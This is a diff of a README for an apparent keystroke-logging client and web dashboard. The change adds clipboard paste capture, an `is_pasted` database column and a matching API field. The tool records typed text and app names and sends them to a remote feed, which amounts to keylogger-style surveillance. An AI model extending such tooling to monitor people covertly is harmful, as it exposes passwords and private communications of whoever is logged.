@@ -10,7 +10,7 @@ Only run the client on computers and accounts you own or are explicitly authoriz
 Keyboard input -> LiveKeyClient.exe -> POST /api/messages -> app.py -> index.html
 ```
 
-Each message contains `text`, `device_id`, and `device_name`. The device number is a stable 12-character value generated from the computer name. The old separate heartbeat process is no longer used. A message is sent when Enter is pressed or after about 2.5 seconds without typing.
+Each message contains `text`, `device_id`, `device_name`, and `is_pasted`. The device number is a stable 12-character value generated from the computer name. The old separate heartbeat process is no longer used. A message is sent when Enter is pressed or after about 2.5 seconds without typing. Clipboard pastes are sent as separate messages and shown with a `Pasted` label and a different bubble color.
 
 ## Files
 
@@ -66,6 +66,7 @@ create table public.messages (
    device_name text not null default 'Unknown device',
    app_name text not null default 'Unknown app',
    time bigint not null,
+   is_pasted boolean not null default false,
    created_at timestamptz not null default now()
 );
 
@@ -77,6 +78,9 @@ If the table already exists, add the new column once:
 ```sql
 alter table public.messages
 add column if not exists app_name text not null default 'Unknown app';
+
+alter table public.messages
+add column if not exists is_pasted boolean not null default false;
 ```
 
 Copy the Supabase PostgreSQL connection string into Render as the secret environment variable:
@@ -123,6 +127,6 @@ The service keeps the latest 200 messages in memory. Configure Supabase as descr
 - `GET /`: web feed.
 - `GET /messages`: stored messages.
 - `GET /events`: live Server-Sent Events stream.
-- `POST /api/messages`: accepts `text`, `device_id`, `device_name`, and `app_name`.
+- `POST /api/messages`: accepts `text`, `device_id`, `device_name`, `app_name`, and `is_pasted`.
 - `GET /api/devices`: devices that have sent messages.
 - `GET /health`: service status and message count.
